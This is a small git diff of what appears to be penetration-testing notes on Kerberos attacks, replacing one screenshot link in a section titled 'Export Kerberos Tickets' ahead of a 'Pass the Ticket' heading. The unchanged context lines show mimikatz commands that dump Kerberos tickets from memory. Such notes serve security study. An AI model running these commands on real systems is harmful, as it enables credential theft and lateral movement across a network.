@@ -33,7 +33,7 @@ Export Kerberos Tickets
     privilege::debug
     sekurlsa::tickets /export
 ![image](https://github.com/user-attachments/assets/325d960d-dbe1-4dd5-8533-3b9b4fa6ccc9)
-![image](https://github.com/user-attachments/assets/b43716c7-7e1b-43c6-bd72-6d231382ed66)
+![image](https://github.com/user-attachments/assets/cf574c3d-244b-4dfa-a7aa-77905f6e0438)
 
 Pass the Ticket
 ---
